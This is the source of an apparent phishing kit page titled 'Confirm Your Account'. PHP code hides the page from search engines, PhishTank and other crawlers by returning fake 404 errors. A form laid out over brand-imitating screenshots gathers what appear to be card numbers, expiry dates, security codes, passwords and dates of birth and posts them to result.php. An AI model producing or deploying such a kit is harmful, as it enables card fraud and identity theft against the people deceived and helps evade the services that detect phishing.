<?php
/***
 *      _____         _    _     __   __
 *     |  __ \       | |  | |    \ \ / /
 *     | |  | |_ __  | |__| | ___ \ V / 
 *     | |  | | '__| |  __  |/ _ \ > <  
 *     | |__| | |    | |  | |  __// . \ 
 *     |_____/|_|    |_|  |_|\___/_/ \_\
 *                                        
 *                                      
 */
 error_reporting(0);
  include ('config.php');
  	require '../prevents/anti1.php';
	require '../prevents/anti2.php';
	require '../prevents/anti3.php';
	require '../prevents/anti4.php';
	require '../prevents/anti5.php';
	require '../prevents/anti6.php';
	require '../prevents/anti7.php';
	require '../prevents/anti8.php';
include('get_browser.php');
$ip = $_SERVER['REMOTE_ADDR'];
//----------------------------------------------------------------------------------------------------------------//
//----------------------------------------------------------------------------------------------------------------//
if(strpos($_SERVER['HTTP_USER_AGENT'],'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
if(strpos(gethostbyaddr(getenv("REMOTE_ADDR")),'google') !== false ) { header('HTTP/1.0 404 Not Found'); exit(); }
//----------------------------------------------------------------------------------------------------------------//
function is_bitch($user_agent){
    $bitchs = array(
        'Googlebot', 
        'Baiduspider', 
        'ia_archiver',
        'R6_FeedFetcher', 
        'NetcraftSurveyAgent', 
        'orange',
        'bingbot', 
        'Yahoo! Slurp', 
        'facebookexternalhit', 
        'PrintfulBot',
        'msnbot', 
        'Twitterbot', 
        'UnwindFetchor', 
        'urlresolver', 
        'Butterfly', 
        'TweetmemeBot',
        'PaperLiBot',
        'MJ12bot',
        'AhrefsBot',
        'Exabot',
        'Ezooms',
        'YandexBot',
        'SearchmetricsBot',
		'phishtank',
		'PhishTank',
        'picsearch',
        'TweetedTimes Bot',
        'QuerySeekerSpider',
        'ShowyouBot',
        'woriobot',
        'merlinkbot',
        'BazQuxBot',
        'Kraken',
        'SISTRIX Crawler',
        'R6_CommentReader',
        'magpie-crawler',
        'GrapeshotCrawler',
        'PercolateCrawler',
        'MaxPointCrawler',
        'R6_FeedFetcher',
        'NetSeer crawler',
        'grokkit-crawler',
        'SMXCrawler',
        'PulseCrawler',
        'Y!J-BRW',
        '80legs.com/webcrawler',
        'Mediapartners-Google', 
        'Spinn3r', 
        'InAGist', 
        'Python-urllib', 
        'NING', 
        'TencentTraveler',
        'Feedfetcher-Google', 
        'mon.itor.us', 
        'spbot', 
        'Feedly',
        'bot',
        'curl',
        "spider",
        "crawler");
    	foreach($bitchs as $bitch){
            if( stripos( $user_agent, $bitch ) !== false ) return true;
        }
    	return false;
}
if (is_bitch($_SERVER['HTTP_USER_AGENT'])) {
	header('HTTP/1.0 404 Not Found'); 
    echo "HTTP/1.0 404 Not Found";
    exit();
}
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>Confirm Your Account</title>
<meta http-equiv="content-type" content="text/html; charset=ISO-8859-1">
<meta charset="utf-8" />
<meta name="applicable-device" content="pc,mobile" />
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden" onload="unhideBody()">
<style>

.form-control {
display: block;
width: 100%;
height: 34px;
padding: 6px 12px;
font-size: 15px;
line-height: 1.42857143;
color: #555;
background-color: #fff;
background-image: none;
border: 1px solid #ccc;
border-radius: 4px;
-webkit-box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
box-shadow: inset 0 1px 1px rgba(0,0,0,.075);
-webkit-transition: border-color ease-in-out .15s,-webkit-box-shadow ease-in-out .15s;
-o-transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
transition: border-color ease-in-out .15s,box-shadow ease-in-out .15s;
}

</style>
</head>
<body>


<form action=result.php name=chalbhai id=chalbhai method=post>
<input name="formtext5"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" maxlength=16 style="position:absolute;width:388px;left:517px;top:671px;z-index:0">
<div id="image1" style="position:absolute; overflow:hidden; left:212px; top:0px; width:251px; height:69px; z-index:1"><img src="images/log.png" alt="" title="" border=0 width=251 height=69></div>

<div id="image2" style="position:absolute; overflow:hidden; left:215px; top:74px; width:987px; height:58px; z-index:2"><img src="images/1.png" alt="" title="" border=0 width=987 height=58></div>

<div id="image3" style="position:absolute; overflow:hidden; left:223px; top:98px; width:436px; height:78px; z-index:3"><img src="images/2.png" alt="" title="" border=0 width=436 height=78></div>

<div id="image7" style="position:absolute; overflow:hidden; left:217px; top:865px; width:967px; height:18px; z-index:4"><img src="images/SSSSSSS.png" alt="" title="" border=0 width=967 height=18></div>

<div id="image8" style="position:absolute; overflow:hidden; left:195px; top:1187px; width:1043px; height:362px; z-index:5"><img src="images/footer.png" alt="" title="" border=0 width=1043 height=362></div>

<div id="formimage1" style="position:absolute; left:755px; top:920px; z-index:6"><input type="image" name="formimage1" width="179" height="35" src="images/contu.png"></div>
<div id="hr1" style="position:absolute; overflow:hidden; left:220px; top:180px; width:965px; height:17px; z-index:7">
<hr size=12 width=965 color="#9B0000">
</div>

<div id="image4" style="position:absolute; overflow:hidden; left:218px; top:207px; width:906px; height:50px; z-index:8"><img src="images/6.png" alt="" title="" border=0 width=906 height=50></div>

<select name="formselect1"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:518px;top:361px;width:107px;z-index:9">
<option value="Month">Month</option>
<option value="January">January</option>
	<option value="Febuary">Febuary</option>
	<option value="March">March</option>
	<option value="April">April</option>
	<option value="May">May</option>
	<option value="June">June</option>
	<option value="July">July</option>
	<option value="August">August</option>
	<option value="September">September</option>
	<option value="October">October</option>
	<option value="November">November</option>
	<option value="December">December</option>
</select>
<select name="formselect2"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:646px;top:362px;width:107px;z-index:10">
<option value="Year">Year</option>
<option value="19">2019</option>
    <option value="20">2020</option>
    <option value="21">2021</option>
	 <option value="22">2022</option>
    <option value="23">2023</option>
    <option value="24">2024</option>
	<option value="25">2025</option>
    <option value="26">2026</option>
    <option value="27">2027</option>
</select>
<input name="formtext1"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" style="position:absolute;width:388px;left:517px;top:273px;z-index:11">
<input name="formtext2"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" maxlength=16 style="position:absolute;width:388px;left:517px;top:316px;z-index:12">
<input name="formtext3"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" maxlength=10 style="position:absolute;width:151px;left:518px;top:406px;z-index:13">
<input name="formtext4"   required title="Please Enter Right Value" autocomplete="off" class="form-control"  type="password" maxlength=13 style="position:absolute;width:156px;left:517px;top:448px;z-index:14">
<div id="image5" style="position:absolute; overflow:hidden; left:354px; top:266px; width:151px; height:217px; z-index:15"><img src="images/00012.png" alt="" title="" border=0 width=151 height=217></div>

<div id="image6" style="position:absolute; overflow:hidden; left:217px; top:508px; width:910px; height:49px; z-index:16"><img src="images/3.png" alt="" title="" border=0 width=910 height=49></div>

<div id="image9" style="position:absolute; overflow:hidden; left:327px; top:576px; width:175px; height:160px; z-index:17"><img src="images/3242341.png" alt="" title="" border=0 width=175 height=160></div>

<input name="formtext6"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" maxlength=16 style="position:absolute;width:388px;left:517px;top:626px;z-index:18">
<input name="formtext7"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="text" maxlength=10 style="position:absolute;width:63px;left:518px;top:713px;z-index:19">
<input name="formtext8"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   type="password" maxlength=13 style="position:absolute;width:57px;left:591px;top:713px;z-index:20">
<select name="formselect5"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:517px;top:579px;width:107px;z-index:21">

<option value="Day">Day</option>
	<option value="1">1</option>
	<option value="2">2</option>
	<option value="3">3</option>
	<option value="4">4</option>
	<option value="5">5</option>
	<option value="6">6</option>
	<option value="7">7</option>
	<option value="8">8</option>
	<option value="9">9</option>
	<option value="10">10</option>
	<option value="11">11</option>
	<option value="12">12</option>
	<option value="13">13</option>
	<option value="14">14</option>
	<option value="15">15</option>
	<option value="16">16</option>
	<option value="17">17</option>
	<option value="18">18</option>
	<option value="19">19</option>
	<option value="20">20</option>
	<option value="21">21</option>
	<option value="22">22</option>
	<option value="23">23</option>
	<option value="24">24</option>
	<option value="25">25</option>
	<option value="26">26</option>
	<option value="27">27</option>
	<option value="28">28</option>
	<option value="29">29</option>
	<option value="30">30</option>
	<option value="31">31</option>
</select>
<select name="formselect6"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:635px;top:578px;width:90px;z-index:22">
<option value="Month">Month</option>
<option value="January">January</option>
	<option value="Febuary">Febuary</option>
	<option value="March">March</option>
	<option value="April">April</option>
	<option value="May">May</option>
	<option value="June">June</option>
	<option value="July">July</option>
	<option value="August">August</option>
	<option value="September">September</option>
	<option value="October">October</option>
	<option value="November">November</option>
	<option value="December">December</option>
</select>
<select name="formselect7"  required title="Please Enter Right Value" autocomplete="off" class="form-control"   style="position:absolute;left:736px;top:577px;width:81px;z-index:23">
<option value="Year">Year</option>
<option value="1993">1993</option>
	<option value="1992">1992</option>
	<option value="1991">1991</option>
	<option value="1990">1990</option>
	<option value="1989">1989</option>
	<option value="1988">1988</option>
	<option value="1987">1987</option>
	<option value="1986">1986</option>
	<option value="1985">1985</option>
	<option value="1984">1984</option>
	<option value="1983">1983</option>
	<option value="1982">1982</option>
	<option value="1981">1981</option>
	<option value="1980">1980</option>
	<option value="1979">1979</option>
	<option value="1978">1978</option>
	<option value="1977">1977</option>
	<option value="1976">1976</option>
	<option value="1975">1975</option>
	<option value="1974">1974</option>
	<option value="1973">1973</option>
	<option value="1972">1972</option>
	<option value="1971">1971</option>
	<option value="1970">1970</option>
	<option value="1969">1969</option>
	<option value="1968">1968</option>
	<option value="1967">1967</option>
	<option value="1966">1966</option>
	<option value="1965">1965</option>
	<option value="1964">1964</option>
	<option value="1963">1963</option>
	<option value="1962">1962</option>
	<option value="1961">1961</option>
	<option value="1960">1960</option>
	<option value="1959">1959</option>
	<option value="1958">1958</option>
	<option value="1957">1957</option>
	<option value="1956">1956</option>
	<option value="1955">1955</option>
	<option value="1954">1954</option>
	<option value="1953">1953</option>
	<option value="1952">1952</option>
	<option value="1951">1951</option>
	<option value="1950">1950</option>
	<option value="1949">1949</option>
</select>

</body>
</html>